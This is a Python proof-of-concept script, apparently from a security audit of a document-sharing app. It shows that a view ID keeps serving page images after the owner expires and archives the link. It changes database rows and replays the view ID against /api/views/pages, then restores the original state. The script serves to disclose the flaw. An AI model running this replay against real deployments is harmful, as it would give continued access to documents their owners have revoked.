#!/usr/bin/env python3
"""PM-02 — a viewId is a 23-hour bearer token for page images that survives
revocation. A legitimate viewer's viewId replays with no cookie and no password,
and keeps serving page images after the owner expires and archives the link.

The proof temporarily un-revokes a document link to mint a fresh view through the
legitimate front door, re-revokes it, shows the back door still open, then
restores the link's original state and deletes the probe view.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/pm-02-viewid-bearer-token-survives-revocation/poc.py
"""
import sys
import pathlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db, db_close, post, as_json, VULN, CONTROL, OBSERVE, log, summary,
)

VICTIM_TEAM = db('select "teamId" from "User" u join "UserTeam" ut on ut."userId"=u.id '
                 "where u.email=$1", ["alice@victim.test"])[0]["teamId"]
# A password-free DOCUMENT_LINK for the victim team, with a primary version.
row = db('select l.id, dv.id as vid, l."expiresAt", l."isArchived" '
         'from "Link" l join "Document" d on d.id=l."documentId" '
         'join "DocumentVersion" dv on dv."documentId"=d.id and dv."isPrimary"=true '
         'where l."teamId"=$1 and l."linkType"=\'DOCUMENT_LINK\' and l.password is null '
         'order by l."expiresAt" nulls last limit 1', [VICTIM_TEAM])[0]
LINK, VER = row["id"], row["vid"]
snap_exp, snap_arch = row["expiresAt"], row["isArchived"]

log(f"PM-02 — viewId is a 23h bearer that survives revocation   base={BASE}")
log(f"  link={LINK}  version={VER}")
log("")

probe_view = None
try:
    # ---- 1. un-revoke so the front door mints a fresh, legitimate view
    db('update "Link" set "expiresAt"=null, "isArchived"=false where id=$1', [LINK])
    o_status, o_text, _ = post("/api/views", {
        "linkId": LINK, "documentVersionId": VER, "documentName": "d", "hasPages": True,
        "ownerId": None, "userId": None, "email": "pm02@probe.test",
    })
    view_id = as_json(o_text).get("viewId")
    probe_view = view_id
    CONTROL("a legitimate open mints a viewId", bool(view_id), f"HTTP {o_status}")

    # ---- 2. the viewId alone (no cookie, no password) serves page images
    p1_status, p1_text, _ = post("/api/views/pages",
                                 {"viewId": view_id, "documentVersionId": VER, "pageNumbers": [1]})
    p1 = as_json(p1_text)
    VULN("the viewId alone serves signed page images",
         p1_status == 200 and len(p1.get("pages", []) or []) > 0,
         f"HTTP {p1_status} pages={len(p1.get('pages', []) or [])}")

    # ---- 3. the owner revokes the link: expire it and archive it
    db('update "Link" set "expiresAt"=now() - interval \'1 day\', "isArchived"=true where id=$1',
       [LINK])
    f_status, f_text, _ = post("/api/views", {
        "linkId": LINK, "documentVersionId": VER, "documentName": "d", "hasPages": True,
        "ownerId": None, "userId": None, "email": "pm02@probe.test",
    })
    CONTROL("the front door refuses after revocation",
            f_status in (403, 404), f"HTTP {f_status}")

    # ---- 4. the same viewId still serves pages after revocation
    p2_status, p2_text, _ = post("/api/views/pages",
                                 {"viewId": view_id, "documentVersionId": VER, "pageNumbers": [1]})
    p2 = as_json(p2_text)
    VULN("the viewId survives revocation: the back door still serves page images",
         p2_status == 200 and len(p2.get("pages", []) or []) > 0,
         f"HTTP {p2_status} pages={len(p2.get('pages', []) or [])}")
    OBSERVE("contradiction", "front door says the link is gone; back door serves the document")
finally:
    if probe_view:
        db('delete from "View" where id=$1', [probe_view])
    db('update "Link" set "expiresAt"=$2, "isArchived"=$3 where id=$1',
       [LINK, snap_exp, snap_arch])
    log("")
    log("  cleanup: probe view deleted; link expiry/archive restored to pre-run state")

summary("PM-02 viewId bearer token survives revocation")
db_close()
